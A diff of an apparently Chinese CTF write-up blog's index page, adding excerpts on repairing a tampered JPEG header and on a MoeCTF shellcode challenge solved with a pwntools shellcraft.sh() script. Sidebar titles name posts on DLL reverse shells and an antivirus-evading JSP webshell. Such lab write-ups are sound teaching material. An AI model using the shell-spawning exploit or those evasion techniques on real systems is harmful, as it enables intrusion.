@@ -139,6 +139,89 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2023/10/03/miscpic/" >Misc-bronken picture_1</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-10-03  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目为打不开的图片，下载附件后用winhex打开：<br><img src="/images/miscpic1.JPG"><br>发现是一个图片文件，有exif信息但是无法打开</p>
+<h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p>上网搜索相关信息，发现一种修改文件头的题型，检查发现图片的文件尾是jpeg图片的文件尾，但文件头经过修改，将文件头修改为jpeg的可以打开图片：<br><img src="/images/miscpic2.JPG"><br><img src="/images/miscpic3.JPG"><br>是一张西电的风景图</p>
+<h1 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h1><p>查看文件属性，发现有flag的提示：<br><img src="/images/miscpic4.JPG"><br>猜测是hex格式的flag，进行hex转字符后得到flag：<br><img src="/images/miscpicflag.JPG"></p>
+<h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.第一次做做到解密flag的时候卡住了，不知道这是hex码，以后知道了<br>2.附上关于文件头隐写的知识：<br>常见文件文件头和隐写术总结 CTF中Misc必备<br>前言</p>
+<p>对常见文件文件头和隐写术做个归纳总结</p>
+<pre><code>文件头文件尾
+图片隐写
+音频隐写
+电子文档隐写
+</code></pre>
+	
+	</div>
+  <a type="button" href="/2023/10/03/miscpic/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/10/02/pwnshell0/" >PWN-shellcode_level0</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-10-02  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目直接说了是shellcode，而且可以脚本一把梭，那就试试看吧</p>
+<h1 id="检查安全性"><a href="#检查安全性" class="headerlink" title="检查安全性"></a>检查安全性</h1><p>先下载附件，放到kali里面用checksec检查一下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec shellcode_level0 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/pwn/MoeCTF/shellcode0/shellcode_level0'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>回显显示，没有任何过滤（canary found，NX disabled），可以尝试使用shellcraft构造shellcode</p>
+<h1 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h1><p>一把梭的脚本如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment"># r = process('./shellcode_level0')</span>
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">43039</span><span class="token punctuation">)</span>
+context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h1>
+	
+	</div>
+  <a type="button" href="/2023/10/02/pwnshell0/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2023/10/02/meoupload/" >Web-another upload</a>
 		</h3>
 		</div>
@@ -419,72 +502,6 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/08/28/webxxe/" >Web-XML External Entity Injection(XXE)</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-08-28  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p><img src="/images/webxxe1.PNG"></p>
-<p><img src="/images/webxxe2.PNG"></p>
-<p>题目给出了一个网站，点击左侧相应的汽车名字就会出现相应的图片和数据。一看没什么问题，那么我们就上burp，给浏览器设置代理，访问192.168.1.101，为什么不是127.0.0.1呢？因为访问这个回环地址burp抓不到包，原因未知但可以使用就好了。</p>
-<p><img src="/images/webxxecap1.PNG"></p>
-<p>观察发现，当我们点击左侧汽车名字的时候，实际上我们是post了相应的请求，抓包修改相应位置的汽车名后发现会跳转到不同的汽车页面。思路这就来了：如果我们post一些其他的东西上去，是否会有突破口？</p>
-<h1 id="尝试突破"><a href="#尝试突破" class="headerlink" title="尝试突破"></a>尝试突破</h1><p>首先，我先post了一个不存在的汽车名称：</p>
-<p><img src="/images/webxxefake1.PNG"></p>
-<p>得到这样一个结果：</p>
-	
-	</div>
-  <a type="button" href="/2023/08/28/webxxe/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/08/27/pwnfd/" >PWN-File Descriptor</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-08-27  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p><img src="/images/pwnfd1.PNG"><br><img src="/images/pwnfd2.PNG"><br><img src="/images/pwnfd3.PNG"><br>大概是要我们输入一个叫fd的东西来读取文件，也就是只要我们输入正确的fd就可以得到flag，那什么是fd呢？</p>
-<p>FD，即“文件描述符”，以下是摘录于知乎的简述：</p>
-<h2 id="fd是什么？"><a href="#fd是什么？" class="headerlink" title="fd是什么？"></a>fd是什么？</h2><p>fd是File descriptor的缩写，中文名叫做：文件描述符。文件描述符是一个非负整数，本质上是一个索引值（这句话非常重要）。</p>
-<h2 id="什么时候拿到的fd？"><a href="#什么时候拿到的fd？" class="headerlink" title="什么时候拿到的fd？"></a>什么时候拿到的fd？</h2><p>当打开一个文件时，内核向进程返回一个文件描述符（ <code>open</code> 系统调用得到 ），后续 <code>read</code>、<code>write</code> 这个文件时，则只需要用这个文件描述符来标识该文件，将其作为参数传入 <code>read</code>、<code>write</code> 。</p>
-<h2 id="fd-的值范围是什么？"><a href="#fd-的值范围是什么？" class="headerlink" title="fd 的值范围是什么？"></a>fd 的值范围是什么？</h2><p>在 POSIX 语义中，0，1，2 这三个 fd 值已经被赋予特殊含义，分别是标准输入（ STDIN_FILENO ），标准输出（ STDOUT_FILENO ），标准错误（ STDERR_FILENO ）。</p>
-<p>文件描述符是有一个范围的：0 ～ OPEN_MAX-1 ，最早期的 UNIX 系统中范围很小，现在的主流系统单就这个值来说，变化范围是几乎不受限制的，只受到系统硬件配置和系统管理员配置的约束。</p>
-	
-	</div>
-  <a type="button" href="/2023/08/27/pwnfd/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -530,7 +547,7 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 			
 	<div class="category-block">
 		<h3 class="asidetitle">Categories</h3>
-			<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">18</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/">2023MoeCTF</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Classical-Crypto/">Classical Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/PWN/">PWN</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Web/">Web</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/">DgutCTF</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/">Web</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/php/">php</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/unicode/">unicode</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">1</span></li></ul>
+			<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">18</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/">2023MoeCTF</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Classical-Crypto/">Classical Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/PWN/">PWN</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/2023MoeCTF/Web/">Web</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/">DgutCTF</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/">Web</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/php/">php</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/DgutCTF/Web/unicode/">unicode</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">奇技淫巧</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Getshell/">Getshell</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">1</span></li></ul>
 	</div>
 
 
@@ -540,19 +557,21 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
+			<li><a href="/tags/奇技淫巧/">奇技淫巧<span>2</span></a></li>
+		
 			<li><a href="/tags/Classical-Crypto/">Classical Crypto<span>1</span></a></li>
 		
-			<li><a href="/tags/Reverse/">Reverse<span>1</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>18</span></a></li>
 		
 			<li><a href="/tags/PWN/">PWN<span>4</span></a></li>
-		
-			<li><a href="/tags/Misc/">Misc<span>5</span></a></li>
 		
 			<li><a href="/tags/项目/">项目<span>1</span></a></li>
 		
 			<li><a href="/tags/速查/">速查<span>1</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>18</span></a></li>
+			<li><a href="/tags/Misc/">Misc<span>5</span></a></li>
+		
+			<li><a href="/tags/Reverse/">Reverse<span>1</span></a></li>
 		
 			<li><a href="/tags/Web/">Web<span>7</span></a></li>
 		
@@ -568,6 +587,14 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/12/10/shitsheet2/" ><i class="fa fa-file-o"></i>奇技淫巧-dll乱弹shell</a>
+      </li>
+    
+      <li>
+        <a href="/2023/12/10/shitsheet1/" ><i class="fa fa-file-o"></i>奇技淫巧-更适合蚁剑宝宝的免杀jsp一句话</a>
+      </li>
+    
+      <li>
         <a href="/2023/10/22/miao/" ><i class="fa fa-file-o"></i>Classical Crypto-喵喵喵？</a>
       </li>
     
@@ -577,14 +604,6 @@ f<span class="token operator">=</span>str1<span class="token punctuation">.</spa
     
       <li>
         <a href="/2023/10/09/miscwav/" ><i class="fa fa-file-o"></i>Misc-Wav</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/08/hello-world/" ><i class="fa fa-file-o"></i>Hello World</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/08/miscppt/" ><i class="fa fa-file-o"></i>Misc-PowerPoinT?</a>
       </li>
     
   </ul>
